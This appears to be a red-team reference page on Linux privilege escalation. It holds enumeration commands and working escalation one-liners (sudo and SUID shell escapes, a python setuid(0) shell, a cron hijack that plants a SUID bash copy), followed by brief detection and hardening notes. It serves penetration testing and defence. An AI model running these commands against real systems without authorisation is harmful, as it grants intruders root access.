---
title: "Linux Privilege Escalation"
category: "red-team"
tags: ["privesc", "linux", "post-exploitation"]
platform: "linux"
mitre: ["T1548", "T1068"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Linux Privilege Escalation

## TL;DR
Enumerate → find a misconfig (sudo, SUID, cron, capabilities, kernel) → escalate. Always start with an automated tool, then verify by hand.

## Enumeration
```bash
# Automated
./linpeas.sh -a
# Manual – quick wins
id; sudo -l                         # what I can run as root
find / -perm -4000 -type f 2>/dev/null     # SUID
getcap -r / 2>/dev/null              # capabilities (cap_setuid=ep!)
cat /etc/crontab; ls -la /etc/cron.*  # cron jobs
uname -a                             # kernel version (exploits)
find / -writable -type d 2>/dev/null  # writable directories
```

## Vectors
```bash
# passwordless sudo / NOPASSWD – check GTFOBins for the binary
sudo -l
# example: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# SUID – GTFOBins
# e.g. SUID on /usr/bin/env:
/usr/bin/env /bin/sh -p

# Capabilities cap_setuid
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'

# Writable PATH + a root cron/script calling a relative binary
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /writable/script

# Kernel exploit (last resort – crash risk)
searchsploit linux kernel 5.x
```

## Detection (Blue Team)
- `sudo` on unusual binaries, creation of SUID files (`chmod +s`).
- auditd: `execve` with `-p` flag, capability changes, cron modifications.

## Mitigation / Hardening
- Minimize SUID (`find / -perm -4000`), remove unnecessary ones.
- `sudoers` without wildcards or shell-escape binaries; least privilege.
- Up-to-date kernel, `noexec`/`nosuid` on `/tmp` and data mounts.

## Sources
- [GTFOBins](https://gtfobins.github.io/) · [linPEAS](https://github.com/peass-ng/PEASS-ng)
- See also: [suid-gtfobins.md](./suid-gtfobins.md)
